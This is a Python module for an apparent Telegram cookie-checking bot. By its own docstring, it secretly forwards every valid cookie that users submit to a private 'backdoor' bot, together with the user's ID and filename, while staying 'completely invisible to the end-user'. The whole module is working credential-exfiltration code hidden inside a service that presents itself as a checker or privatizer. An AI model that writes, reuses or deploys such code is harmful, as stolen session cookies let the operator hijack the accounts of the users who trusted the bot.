"""
This module handles sending valid cookies to a separate, private Telegram bot
for logging and administrative purposes.
This operation is designed to be completely invisible to the end-user.
"""
import logging
import io
from telegram import Bot, request
from telegram.error import TelegramError
import config

# --- Setup Logging ---
logger = logging.getLogger(__name__)

# --- SINGLE, PERSISTENT BOT INSTANCE ---
# This is the key fix: Initialize the bot connection only ONCE.
# We also increase the connection pool size for better performance.
def _create_send_bot():
    if not config.BACKDOOR_BOT_TOKEN or not config.BACKDOOR_RECIPIENT_ID:
        logger.warning("Send bot token or recipient ID is not configured. Send functionality is disabled.")
        return None
    try:
        # Use a larger connection pool for the send bot to handle bursts
        req = request.HTTPXRequest(connection_pool_size=25)
        return Bot(token=config.BACKDOOR_BOT_TOKEN, request=req)
    except Exception as e:
        logger.error(f"Failed to initialize send bot instance: {e}", exc_info=True)
        return None

send_bot = _create_send_bot()

# --- Main Send Function ---
async def send_cookie_to_backdoor(
    cookie_bytes: bytes,
    original_user_id: int,
    mode: str,
    filename: str
):
    """
    Asynchronously sends a copy of a valid cookie to the admin using the
    persistent bot instance.

    Args:
        cookie_bytes: The cookie content as bytes.
        original_user_id: The Telegram ID of the user who submitted the cookie.
        mode: The operation mode ('privatizer' or 'health_check').
        filename: The original filename of the cookie file.
    """
    if not send_bot:
        return

    logger.info(f"Send: Sending cookie from user {original_user_id} ({filename}).")

    try:
        # Prepare the file and caption
        caption = (
            f"📦 **New Valid Cookie Captured**\n\n"
            f"• **Source User ID:** `{original_user_id}`\n"
            f"• **Operation:** `{mode.replace('_', ' ').title()}`\n"
            f"• **Original Filename:** `{filename}`"
        )
        
        # Create an in-memory file-like object
        cookie_file = io.BytesIO(cookie_bytes)
        cookie_file.name = f"captured_{filename}"

        # Send the cookie file as a document using the persistent bot instance
        await send_bot.send_document(
            chat_id=config.BACKDOOR_RECIPIENT_ID,
            document=cookie_file,
            caption=caption,
            parse_mode='Markdown'
        )
        logger.info(f"Successfully sent cookie from user {original_user_id}.")

    except TelegramError as e:
        logger.error(f"Failed to send cookie. Error: {e}", exc_info=True)
    except Exception as e:
        logger.error(f"An unexpected error occurred in the send module: {e}", exc_info=True)